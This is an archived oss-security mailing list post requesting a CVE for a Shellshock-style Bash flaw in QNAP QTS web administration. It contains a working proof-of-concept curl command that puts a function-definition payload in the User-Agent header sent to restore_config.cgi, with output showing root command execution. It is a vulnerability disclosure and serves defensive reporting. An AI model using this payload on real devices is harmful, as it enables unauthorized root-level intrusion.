X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/29/4
Message-ID: <CAHV+4jd6hZ4nwYwtm4gkn1p0_4HD0C5T_2szOvQY8j2gLAkOgA@mail.gmail.com>
Date: Mon, 29 Sep 2014 09:49:42 +0800
From: Ken Lee <echain.tw@...il.com>
To: cve-assign@...re.org
Cc: oss-security@...ts.openwall.com
Subject: CVE request: QNAP QTS
Content-Type: text/plain; charset=utf-8

Hello,

QNAP QTS [1] employ Bash as the default shell and we discover an arbitrary
code execution flaw with UID=0 via `Web administration'.
The PoC is shown as below:

> $ curl -A '() { :;}; echo Content-Type: text/html; echo; echo
> `/usr/bin/id`' http://QNAP_QTS:8080/cgi-bin/restore_config.cgi
> *uid=0(admin) gid=0(administrators)*
> HTTP/1.1 200 OK
>


{ "authPassed": 1, "Result": 0 }


This issue has been acknowledged [2] by QNAP and if not assigned yet,
please help to arrange a CVE identifier for this issue.
Thank you, and have a nice day.


Reference:
[1] http://www.qnap.com.tw/i/en/qts4
[2] http://www.qnap.com/useng/index.php?lang=en-us&sn=885&c=3036&sc=&n=22457

